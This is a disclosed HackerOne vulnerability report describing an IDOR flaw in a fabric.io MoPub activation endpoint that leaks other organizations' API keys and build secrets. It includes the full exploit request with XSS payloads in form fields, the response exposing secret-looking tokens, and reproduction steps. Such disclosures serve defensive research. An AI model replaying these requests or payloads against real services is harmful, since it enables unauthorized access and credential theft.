---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '95552'
original_report_id: '95552'
title: IDOR- Activate Mopub on different organizations- steal api token- Fabric.io
weakness: Improper Authentication - Generic
team_handle: x
created_at: '2015-10-24T07:40:42.855Z'
disclosed_at: '2016-01-25T19:20:01.911Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 12
tags:
- hackerone
- improper-authentication-generic
---

# IDOR- Activate Mopub on different organizations- steal api token- Fabric.io

## Metadata

- HackerOne Report ID: 95552
- Weakness: Improper Authentication - Generic
- Program: x
- Disclosed At: 2016-01-25T19:20:01.911Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Hello,**

There is an option to enroll your organization in fabric.io for mopub , but this particular end point is missing proper authorization checks allowing any user to steal API tokens.

Vulnerable request
================
```
POST /api/v3/organizations/5460d2394b793294df01104a/mopub/activate HTTP/1.1
Host: fabric.io
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-CSRF-Token: 0jGxOZOgvkmucYubALnlQyoIlsSUBJ1VQxjw0qjp73A=
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-CRASHLYTICS-DEVELOPER-TOKEN: 0bb5ea45eb53fa71fa5758290be5a7d5bb867e77
X-Requested-With: XMLHttpRequest
Referer: https://fabric.io/img-srcx-onerrorprompt15/android/apps/app.myapplication/mopub
Content-Length: 235
Cookie: <redacted>
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

company_name=dragoncompany&address1=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt(1)%3E&address2=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt(1)%3E&city=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt(1)%3E&state=asdas&zip_code=50094&country_code=IN&link=false
```

Response
==================
```
{"mopub_identity":{"id":"5496c76e8b15dabe9c0006d7","confirmed":true,"primary":false,"service":"mopub","token":"35592"},"organization":{"id":"5460d2394b793294df01104a","name":"\u003Ca href=\"javascript:alert(1);\"\u003Es\u003C/a\u003E\u003Ch1\u003Etest\u003C/h1\u003E","alias":"img-srcx-onerrorprompt1s-projects2","api_key":"8590313c7382375063c2fe279a4487a98387767a","enrollments":{"beta_distribution":"true"},"accounts_count":3,"apps_counts":{"android":2},"sdk_organization":true,"build_secret":"5ef0323f62d71c475611a635ea09a3132f037557d801503573b643ef8ad82054","mopub_id":"33525"}}
```

Steps to reproduce
==================
- create two accounts
- note down organization id's from both the accounts
- repeat the above request with organization id of B from account A
- you will be able to steal victims mopub API key

POC screenshot attached.

**Regards
WeSecureApp**

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
